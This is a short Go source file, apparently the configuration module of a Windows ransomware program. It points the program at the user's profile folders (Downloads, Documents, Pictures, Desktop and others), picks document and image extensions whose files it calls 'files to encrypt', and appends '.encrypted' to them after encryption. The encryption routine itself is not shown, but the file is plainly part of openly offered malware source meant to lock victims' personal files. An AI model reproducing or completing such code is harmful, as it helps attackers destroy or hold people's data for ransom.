package cmd

import (
	"fmt"
	"log"
	"os"
	"runtime"
)

var (
	// Base directory
	BaseDir = fmt.Sprintf("%s\\", os.Getenv("USERPROFILE"))

	// Directories inside BaseDir to loop over
	InterestingDirs = []string{"Downloads", "Videos", "Pictures", "Documents", "Music", "Desktop"}

	// Interesting extensions to match files
	InterestingExtensions = []string{"doc", "docx", "png", "jpeg", "jpg", "pdf", "txt", "svg", "gif"}

	// Files to encrypt that match the extensions pattern
	MatchedFiles = make(chan File)

	// Workers processing the files
	NumWorkers = 2

	// Extension appended to files after encryption
	EncryptionExtension = ".encrypted"
)

// Execute only on windows
func CheckOS() {
	if runtime.GOOS != "windows" {
		log.Fatalln("Sorry, but your OS is currently not supported. Try again with a windows machine")
	}
}
